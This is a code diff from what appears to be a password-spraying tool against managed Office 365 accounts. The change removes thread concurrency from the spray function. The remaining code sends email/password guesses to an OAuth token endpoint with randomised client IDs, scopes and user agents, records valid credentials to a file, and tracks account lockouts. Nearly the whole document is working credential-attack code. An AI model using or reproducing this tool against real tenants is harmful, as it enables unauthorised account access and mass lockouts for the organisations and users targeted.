@@ -30,62 +30,48 @@ func SprayManagedO365(
 	threads int,
 ) {
 
-	semaphore := make(chan struct{}, threads)
-	var wg sync.WaitGroup
-	semaphore <- struct{}{}
-	wg.Add(1)
-	go func() {
-		defer func() {
-			<-semaphore
-			wg.Done()
-		}()
-
-
-		getOauthTokenRequestJSON := url.Values{}
-		getOauthTokenRequestJSON.Add("resource", constants.RESOURCES[rand.Intn(len(constants.RESOURCES))])
-		getOauthTokenRequestJSON.Add("client_id", constants.CLIENT_IDS[constants.GetMapItemRandKey(constants.CLIENT_IDS)])
-		getOauthTokenRequestJSON.Add("grant_type", constants.GRANT_TYPE)
-		getOauthTokenRequestJSON.Add("scope", constants.SCOPES[rand.Intn(len(constants.SCOPES))])
-		getOauthTokenRequestJSON.Add("username", email)
-		getOauthTokenRequestJSON.Add("password", password)
-		client := &http.Client{}
-		req, err := http.NewRequest("POST", constants.GET_OAUTH_TOKEN, strings.NewReader(getOauthTokenRequestJSON.Encode()))
-		req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-		resp, err := client.Do(req)
-		if err != nil {
-			log.Fatalln(err)
-		}
-		defer resp.Body.Close()
-		body, err := ioutil.ReadAll(resp.Body)
-		var getOauthTokenResponseJSON constants.GetOauthTokenResponseJSON
-		json.Unmarshal(body, &getOauthTokenResponseJSON)
-		if resp.StatusCode == 200 {
-			go sprayCounter()
-			color.Green("[+] Valid Credential : " + email + " - " + password)
-			logging.LogSprayedAccount(file, email, password)
-		}
-		checkError := false
-		if len(getOauthTokenResponseJSON.ErrorCodes) > 0 {
-			checkError = true
-		}
-		if checkError {
-			if getOauthTokenResponseJSON.ErrorCodes[0] == 50053 {
-				go accountLocked()
-				color.Cyan("[*] Account Locked Out : " + email)
-				if lockedAccounts == maxLockouts {
-					color.Red("[-] Reached Maximum Account Lockouts. Exiting !")
-					os.Exit(-1)
-				}
-			}
-			if command == "standalone" && resp.StatusCode != 200 && getOauthTokenResponseJSON.ErrorCodes[0] != 50053 {
-				color.Red("[+] Invalid Credential : " + email + " - " + password)
+	getOauthTokenRequestJSON := url.Values{}
+	getOauthTokenRequestJSON.Add("resource", constants.RESOURCES[rand.Intn(len(constants.RESOURCES))])
+	getOauthTokenRequestJSON.Add("client_id", constants.CLIENT_IDS[constants.GetMapItemRandKey(constants.CLIENT_IDS)])
+	getOauthTokenRequestJSON.Add("grant_type", constants.GRANT_TYPE)
+	getOauthTokenRequestJSON.Add("scope", constants.SCOPES[rand.Intn(len(constants.SCOPES))])
+	getOauthTokenRequestJSON.Add("username", email)
+	getOauthTokenRequestJSON.Add("password", password)
+	client := &http.Client{}
+	req, err := http.NewRequest("POST", constants.GET_OAUTH_TOKEN, strings.NewReader(getOauthTokenRequestJSON.Encode()))
+	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	var getOauthTokenResponseJSON constants.GetOauthTokenResponseJSON
+	json.Unmarshal(body, &getOauthTokenResponseJSON)
+	if resp.StatusCode == 200 {
+		go sprayCounter()
+		color.Green("[+] Valid Credential : " + email + " - " + password)
+		logging.LogSprayedAccount(file, email, password)
+	}
+	checkError := false
+	if len(getOauthTokenResponseJSON.ErrorCodes) > 0 {
+		checkError = true
+	}
+	if checkError {
+		if getOauthTokenResponseJSON.ErrorCodes[0] == 50053 {
+			go accountLocked()
+			color.Cyan("[*] Account Locked Out : " + email)
+			if lockedAccounts == maxLockouts {
+				color.Red("[-] Reached Maximum Account Lockouts. Exiting !")
+				os.Exit(-1)
 			}
 		}
+		if command == "standalone" && resp.StatusCode != 200 && getOauthTokenResponseJSON.ErrorCodes[0] != 50053 {
+			color.Red("[+] Invalid Credential : " + email + " - " + password)
+		}
+	}
 
-	}()
-
-	wg.Wait()
 }
 
 func SprayEmailsManagedO365(
@@ -98,7 +84,6 @@ func SprayEmailsManagedO365(
 	lockout int,
 	lockoutDelay int,
 	maxLockouts int,
-	threads int,
 ) {
 	color.Yellow("[+] Spraying For O365 Emails - Managed")
 	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
@@ -143,7 +128,6 @@ func SprayEmailsManagedO365(
 					"file",
 					maxLockouts,
 					logFile,
-					threads,
 				)
 				time.Sleep(time.Duration(delay))
 			}
@@ -173,7 +157,6 @@ func SprayEmailsManagedO365(
 					"file",
 					maxLockouts,
 					logFile,
-					threads,
 				)
 				time.Sleep(time.Duration(delay))
 			}
@@ -215,7 +198,6 @@ func SprayEmailsManagedO365(
 						"file",
 						maxLockouts,
 						logFile,
-						threads,
 					)
 					time.Sleep(time.Duration(delay))
 				}
